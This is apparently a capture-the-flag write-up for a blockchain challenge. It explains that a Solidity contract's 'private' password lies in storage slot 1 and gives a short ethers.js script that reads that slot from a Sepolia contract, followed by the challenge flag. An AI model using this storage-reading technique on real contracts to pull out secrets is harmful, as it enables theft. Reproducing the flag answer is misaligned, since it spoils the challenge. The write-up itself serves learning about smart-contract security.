## Hello 你好

access sol private var password
slot 0 => cleared (1 bit)
slot 1 => password (32 byte)

```js
const {ethers} = require('ethers')
const rpc_url = 'wss://eth-sepolia.g.alchemy.com/v2/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
const provider = new ethers.WebSocketProvider(rpc_url)

async function start() {
  const contract_address = '0x259f8c60a85d615bc6d10770180cae25e30c66bd'
  const data = await provider.getStorage(contract_address, 1)
  console.log('Private Data :', data)
}

start()
```

PUCTF24{bl0ckch41n_1s_4w3s0m3_5ayAh5pJsXLBhlwsqTh3sU7nZL8fUKQu}